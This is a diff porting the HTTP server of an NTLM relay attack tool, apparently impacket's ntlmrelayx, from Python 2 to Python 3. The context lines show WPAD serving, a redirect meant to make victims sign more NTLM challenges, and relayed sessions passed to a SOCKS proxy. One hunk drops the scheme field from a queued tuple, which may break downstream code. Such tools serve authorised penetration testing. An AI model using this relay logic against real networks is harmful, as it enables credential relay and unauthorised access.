@@ -13,8 +13,8 @@
 # Description:
 #             This is the HTTP server which relays the NTLMSSP  messages to other protocols
 
-import SimpleHTTPServer
-import SocketServer
+import http.server
+import socketserver
 import socket
 import base64
 import random
@@ -31,7 +31,7 @@ from impacket.examples.ntlmrelayx.servers.socksserver import activeConnections
 
 class HTTPRelayServer(Thread):
 
-    class HTTPServer(SocketServer.ThreadingMixIn, SocketServer.TCPServer):
+    class HTTPServer(socketserver.ThreadingMixIn, socketserver.TCPServer):
         def __init__(self, server_address, RequestHandlerClass, config):
             self.config = config
             self.daemon_threads = True
@@ -39,9 +39,9 @@ class HTTPRelayServer(Thread):
                 self.address_family = socket.AF_INET6
             # Tracks the number of times authentication was prompted for WPAD per client
             self.wpad_counters = {}
-            SocketServer.TCPServer.__init__(self,server_address, RequestHandlerClass)
+            socketserver.TCPServer.__init__(self,server_address, RequestHandlerClass)
 
-    class HTTPHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
+    class HTTPHandler(http.server.SimpleHTTPRequestHandler):
         def __init__(self,request, client_address, server):
             self.server = server
             self.protocol_version = 'HTTP/1.1'
@@ -60,17 +60,17 @@ class HTTPRelayServer(Thread):
                 self.target = self.server.config.target.getTarget(self.server.config.randomtargets)
                 LOG.info("HTTPD: Received connection from %s, attacking target %s://%s" % (client_address[0] ,self.target.scheme, self.target.netloc))
             try:
-                SimpleHTTPServer.SimpleHTTPRequestHandler.__init__(self,request, client_address, server)
-            except Exception, e:
+                http.server.SimpleHTTPRequestHandler.__init__(self,request, client_address, server)
+            except Exception as e:
                 LOG.error(str(e))
                 LOG.debug(traceback.format_exc())
 
         def handle_one_request(self):
             try:
-                SimpleHTTPServer.SimpleHTTPRequestHandler.handle_one_request(self)
+                http.server.SimpleHTTPRequestHandler.handle_one_request(self)
             except KeyboardInterrupt:
                 raise
-            except Exception, e:
+            except Exception as e:
                 LOG.error('Exception in HTTP request handler: %s' % e)
                 LOG.debug(traceback.format_exc())
 
@@ -80,7 +80,7 @@ class HTTPRelayServer(Thread):
         def send_error(self, code, message=None):
             if message.find('RPC_OUT') >=0 or message.find('RPC_IN'):
                 return self.do_GET()
-            return SimpleHTTPServer.SimpleHTTPRequestHandler.send_error(self,code,message)
+            return http.server.SimpleHTTPRequestHandler.send_error(self,code,message)
 
         def serve_wpad(self):
             wpadResponse = self.wpad % (self.server.config.wpad_host, self.server.config.wpad_host)
@@ -122,7 +122,7 @@ class HTTPRelayServer(Thread):
 
         #Trickery to get the victim to sign more challenges
         def do_REDIRECT(self, proxy=False):
-            rstr = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(10))
+            rstr = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in list(range(10)))
             self.send_response(302)
             self.send_header('WWW-Authenticate', 'NTLM')
             self.send_header('Content-type', 'text/html')
@@ -252,7 +252,7 @@ class HTTPRelayServer(Thread):
             return
 
         def do_ntlm_negotiate(self, token, proxy):
-            if self.server.config.protocolClients.has_key(self.target.scheme.upper()):
+            if self.target.scheme.upper() in self.server.config.protocolClients:
                 self.client = self.server.config.protocolClients[self.target.scheme.upper()](self.server.config, self.target)
                 # If connection failed, return
                 if not self.client.initConnection():
@@ -294,8 +294,7 @@ class HTTPRelayServer(Thread):
             # Check if SOCKS is enabled and if we support the target scheme
             if self.server.config.runSocks and self.target.scheme.upper() in self.server.config.socksServer.supportedSchemes:
                 # Pass all the data to the socksplugins proxy
-                activeConnections.put((self.target.hostname, self.client.targetPort, self.target.scheme.upper(),
-                                       self.authUser, self.client, self.client.sessionData))
+                activeConnections.put((self.target.hostname, self.client.targetPort, self.authUser, self.client, self.client.sessionData))
                 return
 
             # If SOCKS is not enabled, or not supported for this scheme, fall back to "classic" attacks
